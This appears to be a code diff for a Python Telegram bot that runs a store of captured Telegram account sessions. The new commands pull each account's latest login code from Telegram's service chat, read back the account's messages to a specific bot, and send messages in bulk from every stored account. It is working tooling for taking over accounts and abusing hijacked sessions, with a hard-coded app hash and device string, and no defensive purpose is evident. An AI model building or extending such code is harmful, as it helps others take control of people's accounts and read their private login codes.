@@ -58,6 +58,7 @@ storage = MemoryStorage()
 dp = Dispatcher(bot, storage=storage)
 
 # Constants
+user_confirmation = {}  # Для хранения подтверждений
 DEFAULT_APP_ID = 2040
 DEFAULT_APP_HASH = "b18441a1ff607e10a989891a5462e627"
 DEFAULT_DEVICE = "103C53311M HP"
@@ -254,6 +255,163 @@ async def cmd_logout_other_sessions(message: types.Message):
         f"• Successfully logged out: {success_count} sessions\n"
         f"• Failed to logout: {fail_count} sessions"
     )
+
+@dp.message_handler(commands=['login'])
+async def cmd_login(message: types.Message):
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        return
+
+    args = message.get_args().strip()
+    if not args.startswith('+'):
+        await message.reply("❗️ Use format: /login +1234567890")
+        return
+
+    if is_main_admin(message.from_user.id):
+        session = sessions_col.find_one({"phone": args})
+    else:
+        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
+    
+    if not session:
+        await message.reply("❌ Session not found.")
+        return
+
+    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+    try:
+        await client.connect()
+        history = await client(GetHistoryRequest(peer=777000, limit=1, offset_date=None,
+                                             offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
+        if history.messages:
+            await message.reply(f"📨 Last Telegram code:\n\n`{history.messages[0].message}`", parse_mode="Markdown")
+        else:
+            await message.reply("⚠️ No messages from Telegram.")
+    except Exception as e:
+        await message.reply(f"❌ Error: {e}")
+    finally:
+        await client.disconnect()
+
+@dp.message_handler(commands=['fa'])
+async def cmd_fa(message: types.Message):
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        return
+
+    args = message.get_args().strip()
+    if not args.startswith('+'):
+        await message.reply("❗️ Use format: /fa +1234567890")
+        return
+
+    if is_main_admin(message.from_user.id):
+        session = sessions_col.find_one({"phone": args})
+    else:
+        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
+    
+    if not session:
+        await message.reply("❌ Session not found.")
+        return
+
+    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+    try:
+        await client.connect()
+        
+        history = await client(GetHistoryRequest(
+            peer='T686T_bot',
+            limit=100,
+            offset_date=None,
+            offset_id=0,
+            max_id=0,
+            min_id=0,
+            add_offset=0,
+            hash=0
+        ))
+        
+        if not history.messages:
+            await message.reply("⚠️ No messages in @T686T_bot.")
+            return
+
+        me = await client.get_me()
+        user_messages = [
+            msg for msg in history.messages 
+            if hasattr(msg, 'out') and msg.out
+        ]
+
+        if not user_messages:
+            await message.reply("⚠️ No messages sent by you found in @T686T_bot.")
+            return
+
+        output = []
+        for msg in user_messages[:25]:
+            if hasattr(msg, 'message') and msg.message:
+                date_str = msg.date.strftime('%Y-%m-%d %H:%M') if hasattr(msg, 'date') else 'unknown date'
+                output.append(f"📤 {date_str}: {msg.message}")
+        
+        if not output:
+            await message.reply("⚠️ No valid messages found.")
+            return
+            
+        await message.reply(f"📤 Your messages to @T686T_bot:\n\n" + "\n\n".join(output))
+        
+    except Exception as e:
+        await message.reply(f"❌ Error: {str(e)}")
+    finally:
+        await client.disconnect()
+
+@dp.message_handler(commands=['sile'])
+async def cmd_sile(message: types.Message):
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        return
+
+    await message.answer("🔄 Starting to send messages from all sessions...")
+    
+    if is_main_admin(message.from_user.id):
+        sessions = list(sessions_col.find({}))
+    else:
+        sessions = list(light_sessions_col.find({"owner_id": message.from_user.id}))
+    
+    if not sessions:
+        await message.answer("❌ No sessions found.")
+        return
+
+    success = 0
+    failed = 0
+    results = []
+    
+    for session in sessions:
+        phone = session.get("phone")
+        session_str = session.get("session")
+        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
+        
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                try:
+                    await client.send_message('T686T_bot', 'hello bro')
+                    results.append(f"✅ {phone} - Message sent")
+                    success += 1
+                except Exception as e:
+                    results.append(f"❌ {phone} - Send error: {str(e)}")
+                    failed += 1
+            else:
+                results.append(f"❌ {phone} - Not authorized")
+                failed += 1
+        except Exception as e:
+            results.append(f"❌ {phone} - Connection error: {str(e)}")
+            failed += 1
+        finally:
+            await client.disconnect()
+    
+    # Send summary
+    summary = (
+        f"📊 Results:\n"
+        f"Total sessions: {len(sessions)}\n"
+        f"Success: {success}\n"
+        f"Failed: {failed}\n\n"
+        f"Detailed results:"
+    )
+    
+    await message.answer(summary)
+    
+    # Send detailed results in chunks
+    for chunk in [results[i:i+20] for i in range(0, len(results), 20)]:
+        await message.answer("\n".join(chunk))       
 
 
 @dp.message_handler(commands=['log'])
